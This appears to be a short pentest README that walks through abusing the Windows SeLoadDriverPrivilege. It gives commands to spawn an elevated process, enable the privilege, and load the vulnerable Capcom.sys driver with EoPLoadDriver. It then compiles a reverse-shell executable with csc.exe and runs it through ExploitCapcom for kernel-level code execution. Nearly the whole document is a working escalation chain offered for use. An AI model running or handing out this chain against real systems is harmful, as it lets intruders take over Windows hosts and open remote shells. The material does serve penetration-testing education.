# SeLoadDriverPriv
Some stuff that can be handy to abuse SeLoadDriverPriv

## Get Priv
In order to get the privilege, we need to spawn a high integrity process
..* Option 1: Load PowerShell or cmd.exe as Administrator (no Administrator group membership required!) - Lesson learned from Wh04m1
..* Option 2: Use elevate.exe to spawn cmd (https://github.com/PaoJiao/elevate)
```
elevate.exe cmd.exe
```

## Enable Privilege
```
. .\Enable-SeLoadDriverPrivilege.ps1
Enable-Privilege SeLoadDriverPrivilege
```

## Compile EoPLoadDriver
```
.\EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\pentest\SeLoadDriverPrivilege\Capcom.sys
```

## Generate Reverse Shell
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /t:exe /out:C:\pentest\SeLoadDriverPrivilege\rev.exe C:\pentest\SeLoadDriverPrivilege\rev.cs
```

## Exploit vulnerable driver
```
.\ExploitCapcom.exe C:\pentest\SeLoadDriverPrivilege\rev.exe
```

References

..* [https://github.com/PaoJiao/elevate](https://github.com/PaoJiao/elevate)
..* [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver)
..* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
..* [https://github.com/FuzzySecurity/Capcom-Rootkit](https://github.com/FuzzySecurity/Capcom-Rootkit)


